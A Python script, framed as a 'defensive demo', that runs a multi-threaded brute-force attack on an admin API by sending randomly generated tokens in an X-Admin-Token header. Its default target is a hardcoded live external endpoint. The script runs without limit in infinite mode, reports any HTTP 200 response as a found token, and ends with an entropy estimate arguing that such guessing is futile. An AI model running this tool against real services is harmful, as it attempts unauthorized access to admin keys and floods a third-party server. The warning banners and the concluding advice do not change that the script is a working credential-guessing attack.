#!/usr/bin/env python3
"""
Strong token format brute-force demo (parallel, realistic format)

WARNING: Use only against systems you own or have explicit permission to test.

Token format: {X}admin{random_part}
  X          — one letter / digit / symbol
  admin      — literal
  random_part — variable-length alphanumeric string (like t4gXpE7srf3g970HkciTATvMUFSNMlRg)

Supports infinite mode (--attempts 0), any number of threads, 0.3s delay per request.
"""

import argparse
import secrets
import signal
import string
import threading
import time
from concurrent.futures import ThreadPoolExecutor

import requests

DEFAULT_URL = "https://claude-code-cli.vibecode-claude.online/manage/keys/list"
DEFAULT_TIMEOUT = 10
DEFAULT_THREADS = 10
DEFAULT_DELAY = 0.3
BATCH_SIZE = 500

# X: one character from letters, digits, symbols
X_CHARS = string.ascii_letters + string.digits + "!@#$%^&*-_+=."

# Random part: alphanumeric (like real token_urlsafe output)
RANDOM_CHARS = string.ascii_letters + string.digits


def generate_token(min_len: int, max_len: int) -> str:
    """Generate token in format: {X}admin{random_part} using crypto-secure RNG."""
    x = secrets.choice(X_CHARS)
    rand_len = secrets.randbelow(max_len - min_len + 1) + min_len
    random_part = "".join(secrets.choice(RANDOM_CHARS) for _ in range(rand_len))
    return f"{x}admin{random_part}"


def live_bruteforce(
    url: str,
    attempts: int,
    threads: int,
    timeout: int,
    delay: float,
    min_len: int,
    max_len: int,
) -> bool:
    infinite = attempts == 0

    print("=" * 60)
    print("STRONG TOKEN FORMAT BRUTE-FORCE DEMO (parallel)")
    print("=" * 60)
    print(f"Target URL:      {url}")
    print(f"Mode:            {'INFINITE (Ctrl+C to stop)' if infinite else f'{attempts:,} attempts'}")
    print(f"Threads:         {threads}")
    print(f"Delay:           {delay}s per request")
    print(f"Token format:    {{X}}admin{{random}}")
    print(f"  X:             1 char from [{X_CHARS[:20]}...]")
    print(f"  admin:         literal")
    print(f"  random:        {min_len}-{max_len} chars [A-Za-z0-9]")
    print(f"Example tokens:  {generate_token(min_len, max_len)}")
    print(f"                  {generate_token(min_len, max_len)}")
    print(f"                  {generate_token(min_len, max_len)}")
    print(f"Timeout:         {timeout}s")
    print()
    print("This generates tokens in the format Xadmin<random> and sends them")
    print("to the real endpoint. It will NOT find the real token.")
    if infinite:
        print("Press Ctrl+C at any time to stop and see statistics.")
    print()

    stop_event = threading.Event()
    found_token = [None]
    tested = [0]
    tested_lock = threading.Lock()
    start_time = time.time()

    def signal_handler(sig, frame):
        print("\n\nStopping... (waiting for in-flight requests)")
        stop_event.set()
    signal.signal(signal.SIGINT, signal_handler)

    thread_local = threading.local()

    def get_session() -> requests.Session:
        if not hasattr(thread_local, "session"):
            thread_local.session = requests.Session()
        return thread_local.session

    def try_random_token(_: int) -> bool:
        if stop_event.is_set():
            return False

        token = generate_token(min_len, max_len)
        headers = {
            "X-Admin-Token": token,
            "User-Agent": "strong-token-format-demo/1.0 (defensive-test)",
        }

        if delay > 0:
            time.sleep(delay)

        try:
            session = get_session()
            resp = session.get(url, headers=headers, timeout=timeout)
            with tested_lock:
                tested[0] += 1
                count = tested[0]

            if count % 100 == 0:
                elapsed = time.time() - start_time
                rate = count / elapsed if elapsed > 0 else 0
                if infinite:
                    print(f"  ... {count:,} tested, {rate:.0f}/s, no hit")
                else:
                    remaining = (attempts - count) / rate if rate > 0 else 0
                    print(f"  ... {count:,}/{attempts:,} tested, "
                          f"{rate:.0f}/s, ~{remaining:.0f}s left, no hit")

            if resp.status_code == 200:
                with tested_lock:
                    if found_token[0] is not None:
                        return False
                    found_token[0] = token
                stop_event.set()
                print(f"\n[{count:,}] token='{token}' -> HTTP 200")
                print(f"\nFOUND: token '{token}' is valid!")
                return True
            elif resp.status_code == 403:
                stop_event.set()
                print(f"\n[{count:,}] token='{token}' -> HTTP 403")
                print("Cloudflare/WAF blocked the request.")
                return False

        except requests.exceptions.Timeout:
            with tested_lock:
                tested[0] += 1
        except requests.exceptions.ConnectionError:
            with tested_lock:
                tested[0] += 1
        except requests.exceptions.RequestException:
            with tested_lock:
                tested[0] += 1

        return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        if infinite:
            while not stop_event.is_set():
                futures = [executor.submit(try_random_token, i)
                           for i in range(BATCH_SIZE)]
                for future in futures:
                    if stop_event.is_set():
                        break
                    future.result()
        else:
            futures = [executor.submit(try_random_token, i) for i in range(attempts)]
            for future in futures:
                if stop_event.is_set():
                    break
                future.result()

        try:
            executor.shutdown(wait=False, cancel_futures=True)
        except TypeError:
            executor.shutdown(wait=False)

    elapsed = time.time() - start_time
    count = tested[0]
    rate = count / elapsed if elapsed > 0 else 0

    # Calculate entropy for the format
    x_space = len(X_CHARS)
    rand_space = len(RANDOM_CHARS)
    avg_len = (min_len + max_len) / 2
    total_space = x_space * (rand_space ** int(avg_len))

    print(f"\n{'=' * 60}")
    print(f"RESULTS")
    print(f"{'=' * 60}")
    print(f"Tokens tested:    {count:,}")
    print(f"Time elapsed:     {elapsed:.1f}s")
    print(f"Speed:            {rate:.0f} attempts/s")
    print(f"Threads:          {threads}")
    print(f"Delay:            {delay}s per request")
    print()
    print(f"Token format:     {{X}}admin{{random}}")
    print(f"  X space:        {x_space} chars")
    print(f"  random space:   {rand_space} chars, length {min_len}-{max_len}")
    print(f"  avg entropy:    ~{total_space:.2e} possible tokens")
    print()
    fraction = count / total_space if total_space > 0 else 0
    years_needed = (total_space / rate) / (365.25 * 24 * 3600) if rate > 0 else float('inf')
    print(f"Fraction tested:  {fraction:.2e} of total")
    print(f"At {rate:.0f}/s with {threads} threads:")
    print(f"  Time to cover:  ~{years_needed:.2e} years")
    print(f"  Universe age:   1.38e10 years")
    print()
    print("CONCLUSION: Even with known format, brute-force is futile.")
    print("Defense: use secrets.token_urlsafe(32) + IP whitelist + rate limiting.")
    print("=" * 60)

    return found_token[0] is not None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Strong token format brute-force demo. "
                    "For authorized defensive testing only."
    )
    parser.add_argument(
        "--url",
        default=DEFAULT_URL,
        help=f"Admin endpoint URL (default: {DEFAULT_URL})",
    )
    parser.add_argument(
        "--attempts",
        type=int,
        default=10000,
        help="Number of tokens to try (default: 10000, 0=infinite).",
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=DEFAULT_THREADS,
        help=f"Number of parallel threads (default: {DEFAULT_THREADS}).",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=DEFAULT_DELAY,
        help=f"Delay before each request in seconds (default: {DEFAULT_DELAY}).",
    )
    parser.add_argument(
        "--min-len",
        type=int,
        default=20,
        help="Minimum length of random part (default: 20).",
    )
    parser.add_argument(
        "--max-len",
        type=int,
        default=40,
        help="Maximum length of random part (default: 40).",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT}).",
    )
    args = parser.parse_args()

    if args.min_len > args.max_len:
        parser.error("--min-len cannot be greater than --max-len")

    if args.threads < 1:
        parser.error("--threads must be at least 1")

    live_bruteforce(
        args.url, args.attempts, args.threads, args.timeout,
        args.delay, args.min_len, args.max_len,
    )


if __name__ == "__main__":
    main()
